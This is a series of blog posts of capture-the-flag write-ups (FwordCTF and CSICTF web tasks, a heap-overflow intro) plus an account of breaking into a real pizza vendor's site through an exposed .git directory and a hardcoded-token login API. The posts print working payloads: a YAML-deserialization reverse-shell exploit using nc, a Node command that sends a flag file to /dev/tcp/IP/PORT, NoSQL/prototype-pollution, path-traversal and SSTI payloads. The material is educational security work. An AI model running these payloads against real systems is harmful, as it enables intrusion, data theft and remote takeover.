&lt;p&gt;Now our goal is to login using fwordadmin account, there&amp;rsquo;s something suspicious in the previous code, when you connect via github you don&amp;rsquo;t need any password but indeed the user is still
saved in the same table where regular registrations are stored so we have to wonder what password is set by default or is there some column to verify the login method (which is not the case).&lt;/p&gt;
&lt;p&gt;The User class confirms our statement, the default password is set to &amp;quot;&amp;quot;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class User(UserMixin,Base):
    __tablename__ = &#39;users&#39;
    id = Column(Integer, primary_key=True)
    username = Column(String(50), unique=True)
    email = Column(String(120), unique=True)
    password_hash=Column(String(200))
    is_admin=Column(Boolean)
    def __init__(self, username=None, email=None,password=&amp;quot;&amp;quot;,is_admin=False):
        self.username = username
        self.email = email
        print(&amp;quot;pass :&amp;quot;+password)
        self.set_password(password)
        self.is_admin=is_admin

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So if we connect with the following credentials we will takeover the admin account:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;login: fwordadmin
password: //
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;There is a check that removes special characters so the password will be interpreted as &amp;quot;&amp;quot; at the end.&lt;/p&gt;
&lt;p&gt;Now we have access to the admin panel that has a feature that parses docker-compose files (yaml file) so even without reading the source code we can know that is a yaml unsafe deserialization exploit.&lt;/p&gt;
&lt;p&gt;The vulnerable code:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def parse(text):
    try:
        res = yaml.load(text, Loader=Loader)
        return res
    except Exception:
        return &amp;quot;An Error has occured&amp;quot;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This is my final exploit that spawns a reverse shell:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import yaml,subprocess,requests

class Payload(object):
        def __reduce__(self):
                return (subprocess.Popen,(tuple(&#39;nc IP PORT -e /bin/bash&#39;.split(&amp;quot; &amp;quot;)),))
deserialized_data = yaml.dump(Payload())  
data1={&amp;quot;username&amp;quot;:&amp;quot;fwordadmin&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;////&amp;quot;}
print(&amp;quot;[+] Payload is: &amp;quot;+deserialized_data)
#yaml.load(deserialized_data,Loader=yaml.Loader)
data2={&amp;quot;service&amp;quot;:deserialized_data}
s=requests.Session()
r=s.post(&amp;quot;https://useless.fword.wtf/login&amp;quot;,data=data1)
if r.status_code==200:
        print(&amp;quot;[+] Logged in successfully&amp;quot;)
r=s.post(&amp;quot;https://useless.fword.wtf/home&amp;quot;,data=data2)
print(&amp;quot;[+] Shell Spawned, check your listener)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I hope you had fun solving this task and learned from it , i tried to inspire it from a project in my internship .&lt;/p&gt;
&lt;h2 id=&#34;otaku-8-solves-500pts&#34;&gt;Otaku (8 solves) 500pts&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/GduvVgP.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;This was a Node Js application with its source code as always (i tried to use all known languages in the web tasks xd), opening the website we have a simple login/register page and a home page.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/4IZ3mAW.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Home Page:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/8y6Dccr.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;We have an update feature after connecting to update our favorite anime and username, le&amp;rsquo;s have a look at its source code:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;app.post(&amp;quot;/update&amp;quot;,(req,res)=&amp;gt;{
        try{
        if(req.session.username &amp;amp;&amp;amp; req.session.anime){
                if(req.body.username &amp;amp;&amp;amp; req.body.anime){
                        var query=JSON.parse(`{&amp;quot;$set&amp;quot;:{&amp;quot;username&amp;quot;:&amp;quot;${req.body.username}&amp;quot;,&amp;quot;anime&amp;quot;:&amp;quot;${req.body.anime}&amp;quot;}}`);
                        client.connect((err)=&amp;gt;{
                                if (err) return res.render(&amp;quot;update&amp;quot;,{error:&amp;quot;An unknown error has occured&amp;quot;});
                                const db=client.db(&amp;quot;kimetsu&amp;quot;);
                                const collection=db.collection(&amp;quot;users&amp;quot;);
                                collection.findOne({&amp;quot;username&amp;quot;:req.body.username},(err,result)=&amp;gt;{
                                        if (err) {return res.render(&amp;quot;update&amp;quot;,{error:&amp;quot;An unknown error has occured&amp;quot;});console.log(err);}
                                        if (result) return res.render(&amp;quot;update&amp;quot;,{error:&amp;quot;This username already exists, Please use another one&amp;quot;});});
                                collection.findOneAndUpdate({&amp;quot;username&amp;quot;:req.session.username},query,{ returnOriginal: false },(err,result)=&amp;gt;{
                                        if (err) return res.render(&amp;quot;update&amp;quot;,{error:&amp;quot;An unknown error has occured&amp;quot;});
                                        var newUser={};
                                        var attrs=Object.keys(result.value);
                                        attrs.forEach((key)=&amp;gt;{
                                                newUser[key.trim()]=result.value[key];
                                                if(key.trim()===&amp;quot;isAdmin&amp;quot;){
                                                        newUser[&amp;quot;isAdmin&amp;quot;]=0;
                                                }
                                        });
                                        req.session.username=newUser.username;
                                        req.session.anime=newUser.anime;
                                        req.session.isAdmin=newUser.isAdmin;
                                        req.session.save();
                                        return res.render(&amp;quot;update&amp;quot;,{error:&amp;quot;Updated Successfully&amp;quot;});
                                });
                        });

                }
                else return res.render(&amp;quot;update&amp;quot;,{error:&amp;quot;An unknown error has occured&amp;quot;});
        }
        else res.redirect(302,&amp;quot;/login&amp;quot;);
}
catch(err){
        console.log(err);
}
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can easily notice the NoSQL injection in &lt;code&gt; var query=JSON.parse(`{&amp;quot;$set&amp;quot;:{&amp;quot;username&amp;quot;:&amp;quot;${req.body.username}&amp;quot;,&amp;quot;anime&amp;quot;:&amp;quot;${req.body.anime}&amp;quot;}}`);&lt;/code&gt; and prototype pollution here :&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; var newUser={};
var attrs=Object.keys(result.value);
attrs.forEach((key)=&amp;gt;{
 newUser[key.trim()]=result.value[key];
if(key.trim()===&amp;quot;isAdmin&amp;quot;){
newUser[&amp;quot;isAdmin&amp;quot;]=0;
  }
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Our goal is to set isAdmin to 1, the prototype pollution vulnerable part is parsing the result json object of NoSQL query, so if we chain the NoSQL injection with prototype
pollution we will have the possibility to set isAdmin to 1, we can achieve this by injecting the following in anime field:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;brrr&amp;quot;,&amp;quot;   &lt;strong&gt;proto&lt;/strong&gt;&amp;quot; : {&amp;ldquo;isAdmin&amp;rdquo;:1}, &amp;ldquo;aaaa&amp;rdquo;:&amp;ldquo;aaa&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;W don&amp;rsquo;t have to forget the whitespace before &lt;code&gt;__proto__&lt;/code&gt; because mongo doesn&amp;rsquo;t accept it by default but we can notice the usage of trim() so adding some whitespace will do the trick.&lt;/p&gt;
&lt;p&gt;Now we have admin access:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/kGcC3xI.png&#34; alt=&#34;ADMIN&#34;&gt;&lt;/p&gt;
&lt;p&gt;In the admin panel we have the possibility to set an environment variable and run a js script, the intended idea is to set &lt;code&gt;NODE_VERSION&lt;/code&gt; env variable to some js code followed by // and then execute /proc/self/environ.
The content of /proc/self/environ will be interpreted as Js code ( we chose NODE_VERSION because it&amp;rsquo;s the first env var, we knew it by connecting to the node docker image and checking its environment variables).&lt;/p&gt;
&lt;p&gt;Final payload:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;envname: NODE_VERSION

env: process.mainModule.require(&#39;child_process&#39;).exec(&amp;quot;bash -c \&amp;quot; cat /flag.txt &amp;gt; /dev/tcp/IP/PORT\&amp;quot;&amp;quot;); //

path: /proc/self/environ

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And Bingo we got our flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/DNO9m4H.png&#34; alt=&#34;FLAG&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;other-writeups&#34;&gt;Other Writeups&lt;/h3&gt;
&lt;p&gt;Super Guesser Team writeups, they solved all web challenges :D 
&lt;a href=&#34;https://github.com/Super-Guesser/ctf/tree/master/Fword%20CTF%202020/writeups&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;LINK&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Hexion Team Otaku task writeup 
&lt;a href=&#34;https://github.com/om3r-v/CTF-solutions/tree/master/FwordCTF/otaku&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;LINK&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;bash-category&#34;&gt;Bash Category&lt;/h2&gt;
&lt;p&gt;These category included some privesc and jail challenges , some really nice writeups were written by the teams that participated, so i&amp;rsquo;ll put some links here (I&amp;rsquo;m just lazy to write my own writeups):&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JailBoss:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;
&lt;a href=&#34;https://github.com/FrigidSec/CTFWriteups/tree/master/FwordCTF/Bash/JailBoss&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup 1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;
&lt;a href=&#34;https://github.com/s-3ntinel/writeups/blob/master/ctf/FwordCTF_2020/bash/JailBoss/README.md&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup 2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CapiCapi&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;
&lt;a href=&#34;https://github.com/Zarkrosh/ctf-writeups/tree/master/2020-FwordCTF#bash---capicapi&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup 1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;
&lt;a href=&#34;https://github.com/PeterPHacker/fword-ctf-writeups/blob/master/README.md&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup 2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Bash is Fun&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;
&lt;a href=&#34;https://github.com/s-3ntinel/writeups/blob/master/ctf/FwordCTF_2020/bash/BashIsFun/README.md&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup 1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;
&lt;a href=&#34;https://github.com/Zarkrosh/ctf-writeups/tree/master/2020-FwordCTF#bash---bash-is-fun&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup 2&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;source-code&#34;&gt;Source Code&lt;/h2&gt;
&lt;p&gt;You can visit this github repo where i&amp;rsquo;ll publish all related things to FwordCTF 2020 ( I have already published the tasks source code )&lt;/p&gt;
&lt;p&gt;
&lt;a href=&#34;https://github.com/kahla-sec/FwordCTF-2020&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;FwordCTF 2020&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Thank you for reading the entire article, if you have any questions you can contact me on twitter @belkahlaahmed1 . organizing this huge CTF was really a unique experience and I learned a lot from it. Long life Fword Team you are just awesome guys.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>CSICTF 2k20 - Web Exploitation</title>
      <link>https://ahmed-belkahla.me/post/csictf2020/</link>
      <pubDate>Tue, 21 Jul 2020 08:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/csictf2020/</guid>
      <description>&lt;p&gt;After a long week of work I decided to participate in CSICTF2k20 with my team Fword since I didn&amp;rsquo;t participate for a long time :( We were among the top 30 teams and we managed to almost solve all Web exploitaion tasks with my teammate @Hera. However I enjoyed solving File Library and The Usual Suspects tasks.&lt;/p&gt;
&lt;h1 id=&#34;file-library-497pts-40-solves&#34;&gt;File Library 497pts (40 solves)&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/IRJZKbM.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;We are given the source code of the task :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const express = require(&#39;express&#39;);
const path = require(&#39;path&#39;);
const fs = require(&#39;fs&#39;);

const app = express();

const PORT = process.env.PORT || 3000;

app.listen(PORT, () =&amp;gt; {
   console.log(`Listening on port ${PORT}`);
});

app.get(&#39;/getFile&#39;, (req, res) =&amp;gt; {
   let { file } = req.query;
   console.log(&amp;quot;file is: &amp;quot;+file);
   if (!file) {
       res.send(`file=${file}\nFilename not specified!`);
       return;
   }

   try {

       if (file.includes(&#39; &#39;) || file.includes(&#39;/&#39;)) {
           res.send(`file=${file}\nInvalid filename!`);
           return;
       }
   } catch (err) {
       res.send(&#39;An error occured!&#39;);
       return;
   }

   if (!allowedFileType(file)) {
       res.send(`File type not allowed`);
       return;
   }

   if (file.length &amp;gt; 5) {
       file = file.slice(0, 5);
   }

   const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);
  console.log(&amp;quot;returnedFile: &amp;quot;+returnedFile);
   fs.readFile(returnedFile, (err) =&amp;gt; {
       if (err) {
           if (err.code != &#39;ENOENT&#39;) console.log(err);
           res.send(&#39;An error occured!&#39;);
           return;
       }

       res.sendFile(returnedFile);
   });
});

app.get(&#39;/*&#39;, (req, res) =&amp;gt; {
   res.sendFile(__dirname + &#39;/index.html&#39;);
});

function allowedFileType(file) {
   const format = file.slice(file.indexOf(&#39;.&#39;) + 1);
console.log(&amp;quot;index +1 is &amp;quot;+file.indexOf(&#39;.&#39;) + 1);    
console.log(&amp;quot;format inside allowedfile is: &amp;quot;+format);
   if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) {
       return true;
   }

   return false;
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I added some logging statements to facilitate things, as you can see when we visit &lt;strong&gt;/getfile&lt;/strong&gt; we can provide in a get parameter a filename that will be displayed for us but there are some restrictions,
we can&amp;rsquo;t use whitespaces or &amp;ldquo;/&amp;rdquo;, there are only four extensions that are allowed (js|ts|c|cpp) .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/ClTfqlL.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;After reading carefully the source code, I was pretty sure that we will use http parameters pollution because there is no check concerning the type of get parameters so we can enter an array and try to exploit the misbehaviour that may occur.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s imagine that we enter the following array :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../proc/self/cwd/flag.txt&amp;quot;,&amp;quot;.&amp;quot;,&amp;ldquo;js&amp;rdquo;]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;1st Check&lt;/strong&gt; : &lt;code&gt;if (file.includes(&#39; &#39;) || file.includes(&#39;/&#39;))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;When includes is applied to an array it will check if there&amp;rsquo;s a field that is equal to the passed parameter (&amp;quot; &amp;quot; and &amp;ldquo;/&amp;rdquo; in our case) which is false here so we can successfully pass this check&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;2nd Check&lt;/strong&gt; : &lt;code&gt;if (!allowedFileType(file))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let&amp;rsquo;s take a look at the code of this function :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;
function allowedFileType(file) {
const format = file.slice(file.indexOf(&#39;.&#39;) + 1);
    if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) {
        return true;
    }

    return false;
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It will slice our array beginning from the indexOf(&amp;quot;.&amp;quot;)+1 so in our case the result will be the last field of our array which is &amp;ldquo;js&amp;rdquo; and Bingo we will also pass this check :D&lt;/p&gt;
&lt;p&gt;The following lines will remove the last two fields of our array :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;if (file.length &amp;gt; 5) {
  file = file.slice(0, 5);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;so our array will become:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../&amp;quot;,&amp;quot;../../proc/self/cwd/flag.txt&amp;quot;]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And finally after resolving the path returnedFile will contain /proc/self/cwd/flag.txt&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; __dirname which is the current directory is ignored because of our &amp;ldquo;../../&amp;rdquo; fields, and &lt;strong&gt;/proc/self/cwd&lt;/strong&gt; is equivalent to the current directory.&lt;/p&gt;
&lt;p&gt;So finally our array will be resolved to the path we want, this is the final payload which is only a traduction to what we said before:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://chall.csivit.com:30222/getfile?file[]=../../&amp;amp;file[]=../../&amp;amp;file[]=../../&amp;amp;file[]=../../&amp;amp;file[]=../../proc/self/cwd/flag.txt&amp;amp;file[]=.&amp;amp;file[]=js
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/sdvZ1eL.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;It was a really nice task so thanks to the author!&lt;/p&gt;
&lt;h1 id=&#34;the-usual-suspects-499pts-32-solves&#34;&gt;The Usual Suspects 499pts (32 solves)&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/qorhTCy.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Visiting the website, a well trained eye can directly notice the possibility of an SSTI attack in icecream parameter.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/zbwADG6.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;We thought that it was a typical SSTI task but unfortunately even after getting RCE using the usual jinja2 SSTI payloads we didn&amp;rsquo;t find anything. The first payload we used:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;{{ &amp;lsquo;&amp;rsquo;.&lt;strong&gt;class&lt;/strong&gt;.&lt;strong&gt;mro&lt;/strong&gt;[1].&lt;strong&gt;subclasses&lt;/strong&gt;()[270](&amp;rsquo;ls&amp;rsquo;,shell=True,stdout=-1).communicate()}}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;After this step we really didn&amp;rsquo;t know what to do, the server used here was Tornado, which is an asynchronous python web server so I started reading its documentation and I noticed that the Main class always inherits from &lt;strong&gt;tornado.web.RequestHandler&lt;/strong&gt;.
After some digging I got a nice idea , what if we list all the subclasses of Object ( The super class, it&amp;rsquo;s the parent of all classes) Then we will list the subclasses of tornado.web.RequestHandler and finally we will check the globals of &lt;strong&gt;get&lt;/strong&gt; function from MainHadnler class.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Get the RequestHandler class:&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;{{ &amp;lsquo;&amp;rsquo;.&lt;strong&gt;class&lt;/strong&gt;.&lt;strong&gt;mro&lt;/strong&gt;[1].&lt;strong&gt;subclasses&lt;/strong&gt;()[363]}}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Get the MainHandler class which inherits from RequestHandler&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;{{ &amp;lsquo;&amp;rsquo;.&lt;strong&gt;class&lt;/strong&gt;.&lt;strong&gt;mro&lt;/strong&gt;[1].&lt;strong&gt;subclasses&lt;/strong&gt;()[363].&lt;strong&gt;subclasses&lt;/strong&gt;()[-1]}}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And finally we will see the &lt;strong&gt;globals&lt;/strong&gt; of get function ( &lt;strong&gt;&lt;strong&gt;globals&lt;/strong&gt;&lt;/strong&gt; is a reference to the dictionary that holds the functionâs global variables ).
Final payload:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{{ &#39;&#39;.__class__.__mro__[1].__subclasses__()[363].__subclasses__()[-1].get.__globals__}}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Bingo we got our flag :D I asked the admin and he told me that this is the unintended solution of the task.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/8pcqJ3T.png&#34; alt=&#34;DISCORD&#34;&gt;&lt;/p&gt;
&lt;p&gt;If you have any questions you can contact me on twitter @BelkahlaAhmed1 or contact our team twitter @FwordTeam ! I hope that you liked the writeup, and don&amp;rsquo;t forget to participate in FwordCTF on 29th of August , a lot of fun challenges will be there.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>How i hacked a famous pizza vendor in Tunisia ?</title>
      <link>https://ahmed-belkahla.me/post/how_i_hacked_a_famous_tunisian_pizza_vendor/</link>
      <pubDate>Wed, 27 May 2020 09:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/how_i_hacked_a_famous_tunisian_pizza_vendor/</guid>
      <description>&lt;h1 id=&#34;how-i-hacked-a-famous-pizza-vendor-in-tunisia-&#34;&gt;&lt;strong&gt;How i hacked a famous pizza vendor in Tunisia ?&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;Generally i&amp;rsquo;m not a fan of bug bounty programs but this time i tried to test my skills in some real world scenario and participate to secure some tunisian websites as they lack a lot of things in term of security :D
It&amp;rsquo;s 11h pm and i was sitting on my laptop like always doing an annoying java homework for school when i felt hungry :(
and accidentally an X pizza (we will call it X pizza as i was asked to not reveal the company name) ad catched my eye on facebook. I decided to take a look on their website and try to
find a way to break it.&lt;/p&gt;
&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;I started browsing the website and doing some basic recon , it was a typical wordpress website without any catching
exploits or some really outdated plugins . I have also ran the famous Wpscan and tried to brute force the admin account but unfortunately i got nothing.&lt;/p&gt;
&lt;p&gt;My next step was trying to explore if there&amp;rsquo;s some insecure code management and Bingo it appeared that the developers forgot the .git directory there, so we can dump the source code of the web app.
I used the famous gitdumper and extractor shell scripts to do that and we were so lucky! i found some juicy informations there ( a database backup for all users and promo codes , wp-config file containing all secret codes and salts used to hash users passwords ..)
This was really some juicy informations but i wanted to explore more , i started reviewing the source code and after a while
i found an awesome api , it checks a hardcoded token and then using only a phone number as input it logins to the phone number owner account :o&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/MqDN2Ai.jpg&#34; alt=&#34;CODE&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;why-do-they-use-it-&#34;&gt;Why do they use it ?&lt;/h3&gt;
&lt;p&gt;This api was meant to be accessed only from the call service employees and the developer told me that only some white listed ips were allowed to visit it. It was like a secret hidden backdoor .&lt;/p&gt;
&lt;p&gt;However using the hardcoded token we can access any account , you may be asking how i found the phone number of a privileged user , the database didn&amp;rsquo;t have any useful informations for this (it was an old DB) so i had to think for a while and finally
i remembered that i found and old list of orders informations in the uploads directory and usually the first order will be
passed by the developer to test the web app so i searched there for a little bit and Bingo after entering the phone
number w got access to the admin dashboard :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/vcFJQX9.jpg&#34; alt=&#34;DASHBOARD&#34;&gt;&lt;/p&gt;
&lt;p&gt;I wanted to stop here but i think it was possible to get a reverse shell by modifying the templating files and
i believe that they are using a shared server (many websites hosted on the same server)
so going so far won&amp;rsquo;t be a good idea .&lt;/p&gt;
&lt;p&gt;I really had fun trying to break the website, the developer was so nice and fixed this out so quickly and for
me i had to skip my morning classes as i completed all this at 4 am and i had to complete my annoying homework tomorrow in the lunch break.&lt;/p&gt;
&lt;p&gt;For those asking i didn&amp;rsquo;t get any bounties for this , i didn&amp;rsquo;t even expect that xd&lt;/p&gt;
&lt;p&gt;Thank you for reading this article, i hope you enjoyed your ride, don&amp;rsquo;t forget to take a look
at my previous articles and follow me on twitter for more exciting content :D&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Detailed Writeups - Binary Exploitation</title>
      <link>https://ahmed-belkahla.me/post/detailed-pwn-writeups/</link>
      <pubDate>Mon, 20 Apr 2020 20:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/detailed-pwn-writeups/</guid>
      <description>&lt;p&gt;To make sure that i learned something well , i always want to write an article about that topic and it&amp;rsquo;ll be an opportunity to do more researchs about it.
The last two days our team Fword participated in two CTFs (UMD CTF and WPICTF) and we were among the top 20 teams in both CTFs so GJ guys &amp;lt;3 anyway that&amp;rsquo;s why i decided to choose the best pwn tasks and write these detailed writeups about them to be a great practical introduction for people who want to dive into binary exploitation .&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; This article assumes that you have basic knowledge of assembly and C language&lt;/p&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;p&gt;1- &lt;strong&gt;Jump Not Found&lt;/strong&gt; From UMD CTF : heap based overflow&lt;/p&gt;
&lt;p&gt;2- &lt;strong&gt;Dorsia3&lt;/strong&gt; From WPI CTF: Format string Vulnerability&lt;/p&gt;
&lt;h2 id=&#34;jump-not-found-400pts-25-solves&#34;&gt;Jump Not Found 400pts (25 solves)&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/nerLXcA.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; You can Download the binary 
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/blob/master/UMDCTF%202020/Jump%20Not%20Found/JNF&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;, give it a try alone before reading the writeup that&amp;rsquo;s the best way to LEARN .&lt;/p&gt;
&lt;h3 id=&#34;tldr&#34;&gt;TL;DR&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Exploit a Heap based overflow to overwrite a function address with the Win function address&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Bypass a little problem of the presence of &amp;ldquo;0x0a&amp;rdquo;(&amp;quot;\n&amp;quot;) in the Win function address&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
&lt;p&gt;Before diving into the exploitation part , let&amp;rsquo;s talk about the heap section ,you have probably heard or used &lt;strong&gt;malloc&lt;/strong&gt; or &lt;strong&gt;calloc&lt;/strong&gt; functions in C ,
these functions are used to allocate memory on the heap,it is a region of your computer&amp;rsquo;s memory that is not managed automatically for you and used for dynamic memory allocation, unlike the stack which we dont have full control over it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/aVPbDZM.png&#34; alt=&#34;SECTIONS&#34;&gt;&lt;/p&gt;
&lt;p&gt;The allocation algorithm in an abstract way is quite simple , we won&amp;rsquo;t dive into too much details , when for example we want to allocate a chunk of 16 bytes using malloc, it&amp;rsquo;s reserved in the heap and malloc returns the address of the beginning of the chunk where we can store the data we want.&lt;/p&gt;
&lt;p&gt;You may be asking how your computer knows where the next free chunk starts ? That&amp;rsquo;s quite simple, before each allocated chunk its size is allocated just before it, so the address of the next free chunk will be :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Address of the beginning of chunk1 + Its size&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This was in a really abstract way , you can do more research alone if you are interested , there is a lot of ressources in the internet :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/7ewvjK7.png&#34; alt=&#34;Allocation&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;Let the fun begin now :D after downloading the binary let&amp;rsquo;s do some basic reverse engineering and read carefully its code , i used ghidra for that purpose , you can download it from its official website.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/Ra3YFyG.png&#34; alt=&#34;CODE&#34;&gt;&lt;/p&gt;
&lt;p&gt;Observing the main function , we can notice that it&amp;rsquo;s allocation two chunks , the first one its size is 0x42 (66 bytes) where our input will be stored and a second chunk which holds an array of function pointers , and based on our input (1 or 2 or 3) the program will call the appropriate function from the heap .&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;  local_20 = (char *)malloc(0x42);
  local_18 = (code **)malloc(0x18);
  *local_18 = jumpToHoth;
  local_18[1] = jumpToCoruscant;
  local_18[2] = jumpToEndor;
&lt;/code&gt;&lt;/pre&gt;
